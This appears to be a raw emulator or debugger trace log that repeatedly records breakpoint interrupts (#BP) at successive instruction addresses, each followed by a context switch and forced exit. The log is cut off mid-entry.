interrupt 3 (#BP, Breakpoint), cip = 45b7af, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b7ce, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b7f2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b7f2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b7f2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b801, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b80f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b82a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b843, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b855, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b86b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b883, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b890, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b89c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b8a8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b926, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b946, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b950, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b955, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b969, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b975, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b985, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b991, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b99b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b9b7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b9d6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45b9f4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ba00, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ba0a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ba11, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ba2f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ba3f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ba66, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ba85, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457572, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457585, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457594, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45759f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4575ab, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4575b5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4575d8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4575e9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457611, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457618, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457618, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457618, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457627, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457636, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457648, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45765a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457662, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457672, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457679, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457687, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457695, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4576a8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4576b4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4576c8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45772c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45773d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457745, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457755, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457765, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457782, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457790, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4577a3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4577d2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4577e8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4577f6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457810, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45781f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457835, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457847, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45784c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457863, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457872, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457885, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4578a2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4578b5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4578d2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4578e7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4578f0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457904, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457904, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457904, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45791b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45792f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45793c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457950, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457966, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45797b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45798d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4579a4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4579c7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4579df, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4579e8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4579f7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457a03, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458f34, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458f4d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458f5b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458f6d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458f7a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458f94, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458faf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458fc7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458fdf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458ff8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45900c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45901a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459034, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45903d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459059, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459061, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459075, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459075, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459075, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459088, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459090, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45909a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4590b1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4590bf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4590da, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4590e4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459103, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459114, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459131, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45913a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45913a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45913a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459155, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4591e5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4591ee, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459206, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459212, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459231, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45923e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459255, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459262, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459275, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45927b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45928b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4592a2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4592b0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4592bd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4592c7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4592e2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4592f5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459306, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459318, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459330, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459343, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45935d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45936d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459392, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4593a4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4593b9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4593d3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4593e4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4593ee, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4593ee, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4593ee, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4593fe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459413, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459423, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459432, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459448, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459458, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45945e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45946e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459483, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4594f9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45950b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45951c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45952e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45954b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459566, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459579, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45959b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4595af, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4595c2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4595e2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4595f0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4595fd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459613, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459633, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45964a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45966a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45966f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45968b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459696, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4596b5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4596c4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4596df, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45973b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45974d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45975b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457de1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457df7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e07, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e24, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e3a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e4d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e5d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e72, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e90, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e98, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e98, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457e98, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457eb4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ec0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ed5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ede, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457eeb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457efe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f0e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f36, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f54, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f68, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f7d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f8e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f98, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f98, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457f98, 